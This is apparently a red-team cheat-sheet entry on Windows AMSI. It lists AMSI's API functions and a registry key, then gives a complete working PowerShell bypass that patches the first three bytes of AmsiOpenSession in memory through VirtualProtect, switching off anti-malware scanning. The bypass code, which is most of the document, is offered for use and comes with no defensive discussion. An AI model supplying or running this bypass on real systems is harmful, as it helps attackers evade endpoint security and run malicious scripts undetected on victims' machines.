## AMSI (Anti-Malware Scan Interface)

### Source
https://www.blazeinfosec.com/post/tearing-amsi-with-3-bytes

### Win32 API functions (defined in amsi.dll)
```
AmsiInitalize
AmsiOpenSession
AmsiScanString
AmsiScanBuffer
AmsiCloseSession
AmsiUninitialize
```

### Registry key
```
HKCU\Software\Microsoft\Windows Script\Settings\AmsiEnable
```

### AMSI bypass
```
function lookFuncAddr{
Param($moduleName, $functionName)

$assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
Where-Object {$_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll')}).GetType('Microsoft.Win32.UnsafeNativeMethods')
$tmp=@()
$assem.GetMethods() | ForEach-Object{If($_.Name -eq 'GetProcAddress') {$tmp+=$_}}
return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType{
Param(
[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
[Parameter(Position = 1)] [Type] $delType = [Void]
)

$type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType',
'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])

$type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
$type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')

return $type.CreateType()
}

[IntPtr]$amsiAddr = lookFuncAddr amsi.dll AmsiOpenSession
$oldProtect = 0
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((lookFuncAddr kernel32.dll VirtualProtect),
(getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))

$vp.Invoke($amsiAddr, 3, 0x40, [ref]$oldProtect)

$3b = [Byte[]] (0x48, 0x31, 0xC0)
[System.Runtime.InteropServices.Marshal]::Copy($3b, 0, $amsiAddr, 3)

$vp.Invoke($amsiAddr, 3, 0x20, [ref]$oldProtect)
```

